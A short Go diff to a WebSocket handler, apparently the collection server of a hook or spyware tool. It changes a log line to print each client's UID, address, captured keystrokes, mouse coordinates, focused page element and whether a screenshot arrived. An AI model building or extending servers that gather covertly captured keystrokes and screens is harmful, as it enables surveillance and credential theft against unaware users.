@@ -147,7 +147,16 @@ func hookWSHandle(w http.ResponseWriter, r *http.Request) {
 			//2. Set ONLINE status
 		}*/
 		//TODO: make this a real feature with DB and stuff...
-		fmt.Printf("%s sent: %s\n", conn.RemoteAddr(), string(msg))
+		//fmt.Printf("%s sent: %s\n", conn.RemoteAddr(), msg)
+		fmt.Printf("UID: %v (%v) sent: action_results=%v spydata.image=%v spydata.keys=%v spydata.mouse=%v spydata.focused=%v\n",
+			data.UID,
+			conn.RemoteAddr(),
+			data.ActionResults,
+			len(data.SpyData.Image) > 0,
+			data.SpyData.Keyboard,
+			data.SpyData.MouseCoords,
+			data.SpyData.FocusedElement,
+		)
 		var frame []byte
 		_, err = base64.StdEncoding.Decode(frame, data.SpyData.Image)
 		if err != nil {
